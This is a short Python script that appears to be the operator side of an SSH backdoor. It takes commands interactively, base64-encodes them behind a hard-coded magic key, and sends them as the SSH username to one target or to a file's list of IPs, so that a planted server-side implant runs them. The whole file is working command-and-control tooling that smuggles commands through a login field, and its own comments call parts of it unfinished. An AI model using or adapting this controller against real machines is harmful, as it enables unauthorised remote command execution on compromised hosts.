# Client to send command to server
# Make sure the key is the same on both lol
import base64, paramiko
from prompt_toolkit import prompt
from prompt_toolkit.completion import NestedCompleter
from prompt_toolkit.history import FileHistory
from os.path import expanduser



commands = NestedCompleter.from_nested_dict({
    'run': {
        'target command' : None
    },
    'run_all': {
        # Not sure how to have the prompt stay open to show arguments
        'target_file command' : None
    },
    'exit': None
})


key = "awawaw---"



while True:

    
    try:
        cmd = prompt('> ', completer=commands, history = FileHistory(expanduser('~/.bd_history')))
        option = cmd.split()[0]
    except KeyboardInterrupt:
        continue
    except EOFError:
        break
    
    if option == "exit":
        break
    if option == "run":
        target = [cmd.split()[1]]
        cmd = " ".join(cmd.split()[2:])

    elif option == "run_all":
        # Open the file and parse the ips
        target = open(cmd.split()[1]).read().split("\n")
        cmd = " ".join(cmd.split()[2:])
    else:
        print("Invalid option")
        continue

    b64 = base64.urlsafe_b64encode(cmd.encode('utf-8')).decode('utf-8')
    print(key + b64)

    for targets in target:
        print(targets)
        ssh=paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            # Not parsing target correctly. Need to fix
            ssh.connect(targets, username=key + b64, password="")
        except Exception as e:
            ssh.close()
            continue

